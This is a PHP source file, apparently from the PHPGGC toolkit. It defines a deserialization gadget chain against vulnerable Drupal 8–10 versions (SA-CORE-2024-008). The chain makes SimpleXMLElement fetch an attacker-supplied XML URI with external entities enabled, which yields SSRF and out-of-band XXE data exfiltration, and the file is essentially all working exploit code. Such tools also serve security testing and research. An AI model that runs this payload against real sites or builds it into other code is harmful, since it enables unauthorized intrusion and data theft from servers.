<?php

namespace GadgetChain\Drupal;

class SSRF1 extends \PHPGGC\GadgetChain\SSRF
{
    public static $version = '>= 8.0.0 < 10.2.11 || >= 10.3.0 < 10.3.9';
    public static $vector = '__wakeup';
    public static $author = 'mcdruid';
    public static $information = 'See: https://gist.github.com/paul-axe/2a384bb5f2d430dd3b63b2484af960f4
    See: https://www.drupal.org/sa-core-2024-008
    https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band';

    public function generate(array $parameters)
    {
        return new \Drupal\Core\Url(
            new \Drupal\Core\Database\StatementPrefetch(
                'SimpleXMLElement',
                [
                    $parameters['uri'], // e.g. 'http://10.11.12.13/xxe.xml'
                    LIBXML_BIGLINES | LIBXML_DTDLOAD | LIBXML_NOENT | LIBXML_PARSEHUGE,
                    true
                ]
            )
        );
    }
}
